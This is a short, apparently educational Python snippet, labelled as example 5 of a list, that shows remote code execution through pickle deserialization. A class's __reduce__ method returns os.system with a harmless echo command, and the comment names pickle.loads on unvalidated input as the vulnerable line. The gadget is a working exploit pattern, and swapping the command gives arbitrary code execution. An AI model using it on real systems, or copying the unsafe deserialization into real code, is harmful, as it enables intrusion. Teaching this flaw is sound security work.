#5.# Remote Code Execution (RCE):


import pickle

class Exploit:
    def __reduce__(self):
        import os
        return os.system, ('echo "RCE!"',)

payload = pickle.dumps(Exploit())
pickle.loads(payload)

# The vulnerable line is the pickle.loads call that deserializes user input without proper validation, allowing for RCE attacks.